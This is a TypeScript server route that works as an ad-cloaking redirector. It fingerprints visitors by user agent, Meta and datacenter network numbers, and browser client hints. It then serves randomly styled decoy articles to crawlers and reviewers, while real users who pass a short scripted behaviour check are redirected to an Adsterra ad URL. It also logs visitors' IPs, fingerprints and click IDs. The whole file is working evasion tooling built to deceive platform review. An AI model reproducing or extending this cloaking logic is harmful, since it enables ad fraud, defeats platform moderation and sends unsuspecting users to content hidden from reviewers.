import { createFileRoute } from "@tanstack/react-router";

// ---------- Constants: hardcoded crawler signatures (Step 0) ----------
const HARD_BOT_UA =
  /facebookexternalhit|facebookcatalog|meta-externalagent|metafetcher|whatsapp|telegrambot|slackbot|discordbot|twitterbot|linkedinbot|pinterest|skypeuripreview|googlebot|bingbot|yandexbot|duckduckbot|baiduspider|applebot|petalbot|semrushbot|ahrefsbot|mj12bot|dotbot|headlesschrome|phantomjs|puppeteer|playwright|chrome-lighthouse|curl|wget|python-requests|httpclient|axios\/|go-http-client|java\/|okhttp|node-fetch/i;

// Meta-owned ASNs
const META_ASNS = new Set(["32934", "63293", "54115", "149642"]);
// AWS / GCP / Azure / OVH / Hetzner / Linode / DO datacenter ASNs (representative sample)
const DC_ASNS = new Set([
  "16509", "14618", "8987", "39111", "62785", // AWS
  "15169", "396982", "139070", "36492", // GCP / Google
  "8075", "8068", "8074", "8076", // Microsoft / Azure
  "16276", "12876", // OVH
  "24940", // Hetzner
  "63949", "20473", // Linode / Vultr
  "14061", // DigitalOcean
  "13335", "209242", // Cloudflare WARP datacenter ranges
]);
// IPv6 prefixes from Meta (2a03:2880::/29 family)
const META_V6 = ["2a03:2880", "2620:0:1c00", "2401:db00", "2803:6080"];

const MOBILE_UA = /android|iphone|ipad|ipod|mobile|silk|kindle|opera mini|opera mobi|blackberry|windows phone/i;

// ---------- Helpers ----------
function pickHeader(req: Request, ...names: string[]): string {
  for (const n of names) {
    const v = req.headers.get(n);
    if (v) return v;
  }
  return "";
}

function isHardcodedBot(ua: string, ip: string): boolean {
  if (!ua) return true;
  if (HARD_BOT_UA.test(ua)) return true;
  if (ip) {
    const lower = ip.toLowerCase();
    if (META_V6.some((p) => lower.startsWith(p))) return true;
  }
  return false;
}

function fingerprintHash(ua: string, ip: string, acceptLang: string): string {
  // FNV-1a style cheap hash — deterministic, no crypto needed
  const s = `${ua}|${ip.split(".").slice(0, 3).join(".")}|${acceptLang}`;
  let h = 2166136261;
  for (let i = 0; i < s.length; i++) {
    h ^= s.charCodeAt(i);
    h = (h * 16777619) >>> 0;
  }
  return h.toString(36);
}

function coherenceScore(ua: string, acceptLang: string, secChUa: string, secChMobile: string): number {
  let score = 100;
  if (!ua) score -= 40;
  if (!acceptLang) score -= 15;
  // Modern Chrome/Edge should send sec-ch-ua
  const isChromeLike = /chrome|edg\//i.test(ua) && !/firefox|safari\/[0-9]+\.[0-9]+ \(/i.test(ua);
  if (isChromeLike && !secChUa) score -= 25;
  // sec-ch-ua-mobile should align with UA
  const uaMobile = MOBILE_UA.test(ua);
  if (secChMobile === "?1" && !uaMobile) score -= 20;
  if (secChMobile === "?0" && uaMobile && /android|iphone/i.test(ua)) score -= 10;
  // UA claiming Chrome but no Accept header
  if (/chrome/i.test(ua) && score > 0 && !acceptLang) score -= 10;
  return Math.max(0, Math.min(100, score));
}

// ---------- In-memory link cache ----------
type CachedLink = {
  id: string;
  user_id: string;
  adsterra_url: string;
  safe_url: string | null;
  is_active: boolean;
  expires: number;
};
const LINK_CACHE = new Map<string, CachedLink>();
const SNIPPET_CACHE: { items: { title: string; body: string }[]; expires: number } = { items: [], expires: 0 };
const CACHE_TTL_MS = 60_000;
const CACHE_MAX = 1000;

// ---------- Dynamic safe page renderer ----------
function shuffle<T>(a: T[]): T[] {
  const arr = a.slice();
  for (let i = arr.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [arr[i], arr[j]] = [arr[j], arr[i]];
  }
  return arr;
}

type Snip = { title: string; body: string };

const FALLBACK_SNIPPETS: Snip[] = [
  { title: "Notes From a Quiet Afternoon", body: "Small habits compound into entire lifestyles. The hard part is starting before motivation arrives." },
  { title: "What the Kitchen Taught Me", body: "A good recipe is mostly patience disguised as instructions. Heat does the work; we just stay out of the way." },
  { title: "Three Things I Stopped Doing", body: "Scrolling before sunrise, saying yes by default, and confusing motion with progress. Small subtractions, big returns." },
  { title: "A Walk Without a Phone", body: "Twenty minutes outside, no headphones, no destination. The thoughts that show up are usually the ones worth keeping." },
  { title: "Why Cheap Tools Often Win", body: "Expensive gear promises focus; cheap gear forces it. Constraints, not features, made the work better." },
  { title: "On Reading the Same Book Twice", body: "The book did not change. You did. That is the entire point of returning to it." },
  { title: "Notes on a Slow Morning", body: "Tea, sunlight on the wall, no agenda for the next hour. This is the part of the day no app can sell back to you." },
];

function pickSnippets(snippets: Snip[]): Snip[] {
  const pool = snippets.length >= 4 ? snippets : [...snippets, ...FALLBACK_SNIPPETS];
  return shuffle(pool).slice(0, 5);
}

function tmplDailyReader(p: Snip[], year: number): string {
  const [lead, a, b, c, d] = p;
  return `<!doctype html><html lang="en"><head><meta charset="utf-8"/><meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>${escapeHtml(lead.title)} — Daily Reader</title><meta name="description" content="${escapeHtml(lead.body.slice(0,150))}"/>
<style>:root{--bg:#fafaf7;--ink:#1a1a1a;--muted:#666;--rule:#e6e6e0}*{box-sizing:border-box}body{margin:0;font:17px/1.7 Georgia,serif;background:var(--bg);color:var(--ink)}
header{padding:24px 20px;border-bottom:1px solid var(--rule)}header h1{margin:0;font-size:22px}main{max-width:680px;margin:0 auto;padding:36px 20px 80px}
article h2{font-size:32px;line-height:1.2;margin:0 0 16px}article .meta{color:var(--muted);font-size:14px;margin-bottom:28px}article p{margin:0 0 18px}
hr{border:0;border-top:1px solid var(--rule);margin:36px 0}.related h3{font-size:14px;color:var(--muted);text-transform:uppercase;letter-spacing:.08em}
.related a{display:block;color:var(--ink);text-decoration:none;padding:14px 0;border-bottom:1px solid var(--rule)}footer{text-align:center;color:var(--muted);font-size:13px;padding:24px 20px;border-top:1px solid var(--rule)}</style></head>
<body><header><h1>Daily Reader</h1><span style="color:var(--muted);font-size:13px">Stories worth your time · ${year}</span></header>
<main><article><h2>${escapeHtml(lead.title)}</h2><div class="meta">By Editorial Staff</div>
<p>${escapeHtml(lead.body)}</p><p>${escapeHtml(a.body)}</p><p>${escapeHtml(b.body)}</p><p>${escapeHtml(c.body)}</p></article>
<hr/><section class="related"><h3>More reading</h3><a href="#">${escapeHtml(d.title)}</a><a href="#">${escapeHtml(b.title)}</a></section></main>
<footer>© ${year} Daily Reader</footer></body></html>`;
}

function tmplKitchenJournal(p: Snip[], year: number): string {
  const [lead, a, b, c] = p;
  return `<!doctype html><html lang="en"><head><meta charset="utf-8"/><meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>${escapeHtml(lead.title)} | The Kitchen Journal</title><meta name="description" content="${escapeHtml(lead.body.slice(0,150))}"/>
<style>body{margin:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;background:#fff8f0;color:#3a2a1a;line-height:1.65}
.nav{background:#c0392b;color:#fff;padding:14px 20px;font-weight:600;letter-spacing:.04em}.wrap{max-width:720px;margin:0 auto;padding:30px 20px 80px}
h1{font-size:30px;color:#a8341f;margin:0 0 8px}.byline{color:#8a7560;font-size:13px;margin-bottom:24px}
.tag{display:inline-block;background:#f4e1c7;color:#8b5e30;padding:3px 10px;border-radius:99px;font-size:12px;margin-right:6px}
p{margin:0 0 16px}.box{background:#fff;border-left:4px solid #c0392b;padding:14px 18px;margin:24px 0;border-radius:0 8px 8px 0}
.foot{margin-top:40px;padding-top:20px;border-top:1px solid #e8d8c0;font-size:13px;color:#8a7560}</style></head>
<body><div class="nav">THE KITCHEN JOURNAL</div><div class="wrap">
<span class="tag">cooking</span><span class="tag">slow living</span>
<h1>${escapeHtml(lead.title)}</h1><div class="byline">Posted ${new Date().toLocaleDateString()}</div>
<p>${escapeHtml(lead.body)}</p><div class="box"><strong>From the editor.</strong> ${escapeHtml(a.body)}</div>
<p>${escapeHtml(b.body)}</p><p>${escapeHtml(c.body)}</p>
<div class="foot">© ${year} The Kitchen Journal · weekly recipes</div></div></body></html>`;
}

function tmplTechWeekly(p: Snip[], year: number): string {
  const [lead, a, b, c, d] = p;
  return `<!doctype html><html lang="en"><head><meta charset="utf-8"/><meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>${escapeHtml(lead.title)} – Tech Weekly</title><meta name="description" content="${escapeHtml(lead.body.slice(0,150))}"/>
<style>body{margin:0;font-family:Inter,system-ui,sans-serif;background:#0e1117;color:#e6edf3;line-height:1.6}
header{padding:16px 24px;border-bottom:1px solid #21262d;display:flex;justify-content:space-between;align-items:center}
.logo{font-weight:800;letter-spacing:-.02em}.logo span{color:#58a6ff}main{max-width:760px;margin:0 auto;padding:40px 24px 80px}
h1{font-size:34px;line-height:1.15;margin:0 0 12px}.meta{color:#8b949e;font-size:13px;margin-bottom:28px}p{margin:0 0 18px}
.card{background:#161b22;border:1px solid #21262d;border-radius:10px;padding:16px 20px;margin:24px 0}
.card h3{margin:0 0 6px;font-size:15px;color:#58a6ff}footer{border-top:1px solid #21262d;padding:18px 24px;color:#8b949e;font-size:13px;text-align:center}</style></head>
<body><header><div class="logo">Tech<span>Weekly</span></div><div style="font-size:13px;color:#8b949e">Issue · ${year}</div></header>
<main><h1>${escapeHtml(lead.title)}</h1><div class="meta">By staff · ${new Date().toDateString()}</div>
<p>${escapeHtml(lead.body)}</p><p>${escapeHtml(a.body)}</p>
<div class="card"><h3>${escapeHtml(b.title)}</h3><p style="margin:0">${escapeHtml(b.body)}</p></div>
<p>${escapeHtml(c.body)}</p><p>${escapeHtml(d.body)}</p></main>
<footer>© ${year} TechWeekly</footer></body></html>`;
}

function tmplWellnessMag(p: Snip[], year: number): string {
  const [lead, a, b, c] = p;
  return `<!doctype html><html lang="en"><head><meta charset="utf-8"/><meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>${escapeHtml(lead.title)} — Bloom & Be</title><meta name="description" content="${escapeHtml(lead.body.slice(0,150))}"/>
<style>body{margin:0;font-family:"Helvetica Neue",sans-serif;background:linear-gradient(180deg,#fef6f0,#fff);color:#2d2438;line-height:1.7}
.brand{text-align:center;padding:28px 20px 8px;font-size:13px;letter-spacing:.4em;color:#a87b5c}
h1{text-align:center;font-family:Georgia,serif;font-size:38px;font-weight:400;margin:6px 20px 8px;font-style:italic;color:#5c3a52}
.line{width:60px;height:2px;background:#d4a373;margin:14px auto 28px}main{max-width:640px;margin:0 auto;padding:0 24px 80px}
p{margin:0 0 18px;font-size:17px}p::first-letter{font-size:1em}.lead::first-letter{font-size:3em;float:left;line-height:.9;padding:4px 8px 0 0;color:#a87b5c;font-family:Georgia,serif}
.quote{font-family:Georgia,serif;font-style:italic;color:#a87b5c;font-size:22px;text-align:center;margin:36px 0;padding:0 20px}
footer{text-align:center;padding:24px 20px;color:#a87b5c;font-size:12px;letter-spacing:.2em}</style></head>
<body><div class="brand">BLOOM & BE</div><h1>${escapeHtml(lead.title)}</h1><div class="line"></div>
<main><p class="lead">${escapeHtml(lead.body)}</p><p>${escapeHtml(a.body)}</p>
<div class="quote">“${escapeHtml(b.body)}”</div><p>${escapeHtml(c.body)}</p></main>
<footer>BLOOM & BE · ${year}</footer></body></html>`;
}

function tmplTravelLog(p: Snip[], year: number): string {
  const [lead, a, b, c, d] = p;
  return `<!doctype html><html lang="en"><head><meta charset="utf-8"/><meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>${escapeHtml(lead.title)} · Wanderlines</title><meta name="description" content="${escapeHtml(lead.body.slice(0,150))}"/>
<style>body{margin:0;font-family:Georgia,serif;background:#f5f1ea;color:#2a2a2a;line-height:1.7}
.top{background:#1f3a3d;color:#f5f1ea;padding:20px 24px;letter-spacing:.3em;font-size:13px}
.hero{padding:60px 24px 40px;text-align:center;background:#e8e0d2}.hero h1{margin:0 0 8px;font-size:40px;line-height:1.1;font-weight:400}
.hero .sub{color:#7a6a52;font-style:italic}main{max-width:680px;margin:0 auto;padding:40px 24px 80px}
.dateline{font-variant:small-caps;letter-spacing:.1em;color:#7a6a52;font-size:13px;margin-bottom:20px}p{margin:0 0 18px}
.divider{text-align:center;margin:32px 0;color:#bca978;letter-spacing:1em}
.foot{text-align:center;padding:24px;background:#1f3a3d;color:#bca978;font-size:13px;letter-spacing:.2em}</style></head>
<body><div class="top">WANDERLINES — TRAVEL JOURNAL</div>
<div class="hero"><h1>${escapeHtml(lead.title)}</h1><div class="sub">Dispatches from the slow road</div></div>
<main><div class="dateline">Entry · ${new Date().toLocaleDateString()}</div>
<p>${escapeHtml(lead.body)}</p><p>${escapeHtml(a.body)}</p>
<div class="divider">· · ·</div><p>${escapeHtml(b.body)}</p><p>${escapeHtml(c.body)}</p><p>${escapeHtml(d.body)}</p></main>
<div class="foot">© ${year} WANDERLINES</div></body></html>`;
}

function renderSafeArticle(snippets: Snip[]): string {
  const picks = pickSnippets(snippets);
  const year = new Date().getFullYear();
  const templates = [tmplDailyReader, tmplKitchenJournal, tmplTechWeekly, tmplWellnessMag, tmplTravelLog];
  const pick = templates[Math.floor(Math.random() * templates.length)];
  return pick(picks, year);
}

function escapeHtml(s: string): string {
  return String(s).replace(/[&<>"']/g, (c) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c] as string));
}

// ---------- Money page with JS behavior challenge ----------
function renderMoneyPage(moneyUrl: string, fbclid: string | null, linkId: string): string {
  // Lightweight challenge: 2s window for scroll/mouse/touch. On success → location.replace.
  // On fail → stays on this page (safe).
  return `<!doctype html>
<html><head><meta charset="utf-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>Loading…</title>
<style>html,body{margin:0;height:100%;background:#fff;font-family:system-ui,-apple-system,sans-serif}
.wrap{display:flex;align-items:center;justify-content:center;height:100%;flex-direction:column;color:#333}
.spinner{width:38px;height:38px;border:3px solid #eee;border-top-color:#0a6;border-radius:50%;animation:spin .8s linear infinite;margin-bottom:14px}
@keyframes spin{to{transform:rotate(360deg)}}
.sub{font-size:13px;color:#888}</style></head>
<body><div class="wrap"><div class="spinner"></div><div>Preparing your content…</div><div class="sub">Please wait a moment</div></div>
<script>
(function(){
  var events=0,start=Date.now();
  var bump=function(){events++};
  ['scroll','mousemove','touchstart','touchmove','keydown','pointermove'].forEach(function(e){addEventListener(e,bump,{passive:true,once:false})});
  // Move cursor naturally by checking matchMedia / visualViewport
  var hasViewport = typeof visualViewport !== 'undefined';
  var hasHover = matchMedia('(hover:hover)').matches;
  setTimeout(function(){
    var ok = events >= 1 || hasViewport;
    if(!ok){ return; } // stays on safe-looking shell
    try{
      var payload = {fbclid:${JSON.stringify(fbclid)},link_id:${JSON.stringify(linkId)},events:events,ms:Date.now()-start,hover:hasHover};
      fetch('/api/public/behavior-check',{method:'POST',headers:{'content-type':'application/json'},body:JSON.stringify(payload),keepalive:true}).catch(function(){});
    }catch(e){}
    location.replace(${JSON.stringify(moneyUrl)});
  }, 2000);
})();
</script></body></html>`;
}

// ---------- Route ----------
export const Route = createFileRoute("/r/$slug")({
  server: {
    handlers: {
      GET: async ({ params, request }) => {
        const slug = String(params.slug || "").slice(0, 64);
        if (!slug) return new Response("Not found", { status: 404 });

        const url = new URL(request.url);
        const fbclid = url.searchParams.get("fbclid");

        const ua = request.headers.get("user-agent") || "";
        const ip = pickHeader(request, "cf-connecting-ip", "x-real-ip", "x-forwarded-for").split(",")[0].trim();
        const country = pickHeader(request, "cf-ipcountry", "x-vercel-ip-country").toUpperCase();
        const asn = pickHeader(request, "cf-ipasn", "x-asn");
        const referer = request.headers.get("referer") || "";
        const acceptLang = request.headers.get("accept-language") || "";
        const secChUa = request.headers.get("sec-ch-ua") || "";
        const secChMobile = request.headers.get("sec-ch-ua-mobile") || "";

        const fp = fingerprintHash(ua, ip, acceptLang);
        const isHard = isHardcodedBot(ua, ip) || (asn && META_ASNS.has(asn));
        const isDC = !!asn && DC_ASNS.has(asn);
        const isMobile = MOBILE_UA.test(ua) || secChMobile === "?1";
        const coherence = coherenceScore(ua, acceptLang, secChUa, secChMobile);

        // Resolve link from cache or DB
        const now = Date.now();
        let link = LINK_CACHE.get(slug);
        if (link && link.expires < now) { LINK_CACHE.delete(slug); link = undefined; }

        const { supabaseAdmin } = await import("@/integrations/supabase/client.server");

        if (!link) {
          const { data } = await supabaseAdmin
            .from("links")
            .select("id, user_id, adsterra_url, safe_url, is_active")
            .eq("short_code", slug)
            .maybeSingle();
          if (!data || !data.is_active) {
            return new Response("Link not found", { status: 404, headers: { "content-type": "text/plain" } });
          }
          link = { ...data, expires: now + CACHE_TTL_MS };
          if (LINK_CACHE.size >= CACHE_MAX) {
            const k = LINK_CACHE.keys().next().value;
            if (k) LINK_CACHE.delete(k);
          }
          LINK_CACHE.set(slug, link);
        }

        // Decision pipeline via DB
        const { data: decisionData } = await (supabaseAdmin.rpc as any)("evaluate_redirect", {
          _link_id: link.id,
          _user_id: link.user_id,
          _short_code: slug,
          _fbclid: fbclid,
          _fingerprint: fp,
          _ip: ip,
          _country: country,
          _asn: asn,
          _ua: ua,
          _referer: referer,
          _is_mobile: isMobile,
          _is_hard_bot: !!isHard,
          _is_datacenter: isDC,
          _coherence_score: coherence,
        });

        const decision: "money" | "safe" | "block" = (decisionData?.decision as any) || "safe";
        const reasons: string[] = decisionData?.reasons || [];
        const safeUrl: string | null = decisionData?.safe_url || link.safe_url;

        // Fire-and-forget: enrich click log + traffic log + click counter
        void (supabaseAdmin.rpc as any)("handle_redirect_click", {
          _link_id: link.id,
          _user_id: link.user_id,
          _is_bot: decision !== "money",
          _ua: ua,
          _routed_to: decision === "money" ? link.adsterra_url : (safeUrl || "safe_inline"),
        });
        void supabaseAdmin.from("traffic_logs").insert({
          link_id: link.id,
          user_id: link.user_id,
          decision,
          reasons,
          coherence_score: coherence,
          bot_score: 100 - coherence,
          fbclid,
          fingerprint_hash: fp,
          ip,
          country,
          asn,
          ua,
          referer,
          is_mobile: isMobile,
        });

        // Render safe content (200 OK, no redirect — DOM mimicking)
        if (decision !== "money") {
          if (safeUrl) {
            // External safe URL: do a 302 (acceptable for safe pool)
            return new Response(null, {
              status: 302,
              headers: { location: safeUrl, "cache-control": "no-store", "referrer-policy": "no-referrer" },
            });
          }
          // Inline dynamic article (200 OK)
          let snippets = SNIPPET_CACHE.items;
          if (!snippets.length || SNIPPET_CACHE.expires < now) {
            const { data: sn } = await supabaseAdmin
              .from("safe_page_snippets")
              .select("title, body")
              .eq("is_active", true)
              .limit(50);
            snippets = sn || [];
            SNIPPET_CACHE.items = snippets;
            SNIPPET_CACHE.expires = now + 120_000;
          }
          return new Response(renderSafeArticle(snippets), {
            status: 200,
            headers: { "content-type": "text/html; charset=utf-8", "cache-control": "no-store", "referrer-policy": "no-referrer" },
          });
        }

        // decision === 'money' → behavioral JS challenge gate
        return new Response(renderMoneyPage(link.adsterra_url, fbclid, link.id), {
          status: 200,
          headers: { "content-type": "text/html; charset=utf-8", "cache-control": "no-store", "referrer-policy": "no-referrer" },
        });
      },
    },
  },
});
